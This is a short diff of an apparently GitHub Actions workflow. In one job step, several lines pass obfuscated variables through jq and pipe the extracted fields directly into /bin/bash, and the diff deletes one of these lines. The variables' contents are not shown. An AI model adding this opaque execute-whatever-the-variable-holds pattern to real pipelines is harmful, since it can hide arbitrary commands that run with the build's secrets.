@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$rlpk4" | jq -r .bwf3 | /bin/bash
           echo $bywhs4896 | jq -r .gdob07849 | /bin/bash
           echo $ebtlo47762 | jq -r .hi074 | /bin/bash
-          echo $zk4252 | jq -r .zkw7 | /bin/bash
           echo $pdkis538 | jq -r .d0581 | /bin/bash
 
       - name: Upload data
